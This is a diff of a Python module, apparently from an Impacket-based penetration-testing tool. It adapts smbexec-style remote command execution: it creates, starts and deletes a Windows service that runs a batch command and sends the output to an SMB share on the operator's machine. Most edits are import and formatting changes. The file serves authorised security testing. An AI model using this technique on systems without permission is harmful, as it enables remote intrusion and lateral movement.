@@ -2,7 +2,27 @@
 # -*- coding: iso-8859-15 -*-
 # -*- Mode: python -*-
 
-from lib.common import *
+import cmd
+import random
+import string
+import os
+import tempfile
+import sys
+from lib.common import DataStore
+from lib.logger import logger
+from subprocess import PIPE, Popen, STDOUT
+
+try:
+    from impacket.dcerpc.v5 import scmr
+    from impacket.smbconnection import ntpath
+except ImportError:
+    sys.stderr.write('You need to install Python Impacket library first.\nGet it from Core Security\'s Google Code'
+                     + 'repository:\nsudo apt-get -y remove python-impacket # to remove the system-installed outdated'
+                     + 'version of the library\ncd /tmp'
+                     + '\nsvn checkout http://impacket.googlecode.com/svn/trunk/ impacket\ncd impacket'
+                     + '\npython setup.py build\nsudo python setup.py install\n')
+    sys.exit(255)
+
 
 ################################################################
 # Code borrowed and adapted from Impacket's smbexec.py example #
@@ -84,21 +104,25 @@ class SvcShell(cmd.Cmd):
 
     def execute_command(self, command):
         if self.__mode == 'SERVER':
-            command = '%s echo %s ^> \\\\%s\\%s\\%s > %s & %s %s' % (self.__shell, command, self.__local_ip, self.__smbserver_share, self.__output_file, self.__batchFile, self.__shell, self.__batchFile)
+            command = '%s echo %s ^> \\\\%s\\%s\\%s > %s & %s %s' % (self.__shell, command, self.__local_ip,
+                                                                     self.__smbserver_share, self.__output_file,
+                                                                     self.__batchFile, self.__shell, self.__batchFile)
         else:
-            command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, command, self.__output_file_path, self.__batchFile, self.__shell, self.__batchFile)
+            command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, command, self.__output_file_path,
+                                                         self.__batchFile, self.__shell, self.__batchFile)
 
         command += ' & del %s' % self.__batchFile
 
         logger.debug('Creating service with executable path: %s' % command)
 
-        resp = scmr.hRCreateServiceW(self.__svc, self.__mgr_handle, '%s\x00' % self.__service_name, '%s\x00' % self.__service_name, lpBinaryPathName='%s\x00' % command)
+        resp = scmr.hRCreateServiceW(self.__svc, self.__mgr_handle, '%s\x00' % self.__service_name, '%s\x00'
+                                     % self.__service_name, lpBinaryPathName='%s\x00' % command)
         self.__service_handle = resp['lpServiceHandle']
 
         try:
             scmr.hRStartServiceW(self.__svc, self.__service_handle)
         except:
-           pass
+            pass
 
         scmr.hRDeleteService(self.__svc, self.__service_handle)
         scmr.hRCloseServiceHandle(self.__svc, self.__service_handle)
